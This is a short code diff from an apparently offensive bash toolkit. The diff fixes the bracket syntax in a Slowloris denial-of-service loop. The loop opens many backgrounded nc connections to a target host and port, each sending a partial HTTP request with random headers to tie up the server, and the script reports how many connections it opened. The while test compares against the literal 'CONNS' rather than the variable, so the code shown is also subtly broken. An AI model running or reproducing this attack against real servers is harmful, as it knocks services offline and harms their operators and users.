@@ -27,7 +27,7 @@ CONNS=200 && echo "Invalid integer!  Using 200 connections"
 	fi 
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
-	while [ "$i" -le "CONNS"]; do
+	while [ "$i" -le "CONNS" ]; do
 echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost:$TARGET\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 --wait=300 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
 }
